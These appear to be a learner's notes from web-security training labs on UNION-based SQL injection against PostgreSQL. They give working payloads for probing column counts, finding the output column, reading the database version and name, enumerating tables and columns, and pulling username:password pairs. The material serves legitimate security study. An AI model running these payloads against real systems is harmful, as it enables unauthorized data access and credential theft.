# 1. UNION-based SQL Injection

The `UNION` SQL operator allows combining the results of two queries.

Example:

```sql
SELECT name, price FROM products
UNION
SELECT username, password FROM users
```

If the attacker can control input, sensitive data can be retrieved.

Example payload:

```
' UNION SELECT NULL,NULL--
```

---

# 2. Why NULL is Used

NULL is commonly used in UNION attacks because:

- NULL accepts all datatypes
- Reduces datatype mismatch errors
- Makes testing easier

Example:

```
' UNION SELECT NULL,NULL,NULL--
```

---

# 3. Finding the Output Column

The attacker identifies which column on the webpage **displays data**.

Testing payloads:

```
' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
```

Wherever `test` appears → that column is the **output column**.

---

# 4. Database Version Detection

Once the output column is identified, database information can be extracted.

Example payload:

```
' UNION SELECT NULL,version(),NULL--
```

Example output:

```
PostgreSQL 13.4
```

---

# 5. Database Name Extraction

For PostgreSQL, the database name can be retrieved using:

```
' UNION SELECT NULL,current_database(),NULL--
```

Example output:

```
academy_labs
```

---

# 6. Table Enumeration

Retrieve all table names in the database:

```
' UNION SELECT NULL,table_name,NULL
FROM information_schema.tables--
```

To filter a specific schema:

```
WHERE table_schema='public'
```

---

# 7. Column Enumeration

Retrieve column names from a specific table:

```
' UNION SELECT NULL,column_name,NULL
FROM information_schema.columns
WHERE table_name='users'--
```

Example output:

```
username
password
```

---

# 8. Extracting Multiple Values in One Column

If there is only one output column, attackers can **combine multiple values** into a single column.

Example:

```
' UNION SELECT NULL,username || ':' || password
FROM users--
```

Example output:

```
administrator:3f8d9h2d9h2
```

---

# Labs Completed

- SQL injection UNION attack: Finding a column containing text
- SQL injection UNION attack: Retrieving data from other tables
- SQL injection UNION attack: Retrieving multiple values in a single column
- SQL injection attack: Querying the database type and version
